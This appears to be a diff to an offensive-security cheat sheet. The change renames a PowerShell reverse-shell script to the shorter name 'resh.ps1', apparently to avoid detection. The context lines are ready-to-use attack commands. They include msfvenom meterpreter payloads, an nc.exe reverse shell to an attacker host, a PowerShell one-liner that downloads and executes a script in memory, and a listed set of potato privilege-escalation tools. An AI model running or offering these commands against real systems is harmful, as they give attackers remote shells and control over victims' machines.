@@ -952,7 +952,7 @@ msfvenom -p python/meterpreter/reverse_tcp LHOST=$MYIP LPORT=7777 -f raw -o shel
 [*] File Transfer
 +---------- My Files ----------+
 nc.exe
-Invoke-PowerShellTcp.ps1
+resh.ps1
 EfsPotato.exe
 SigmaPotato.exe
 jp32.exe
@@ -987,7 +987,7 @@ C:\programdata\nc.exe $MYIP 5555 -e cmd.exe
 
 +---------- Shell From Memory ----------+
 rlwrap nc -lvnp 5555
-powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:8888/windows/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse $MYIP -Port 5555"
+powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:8888/windows/resh.ps1');resh -Reverse $MYIP -Port 5555"
 
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$MYIP LPORT=5555 -f psh -o 0.ps1
 rlwrap msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST $MYIP; set LPORT 5555; run"
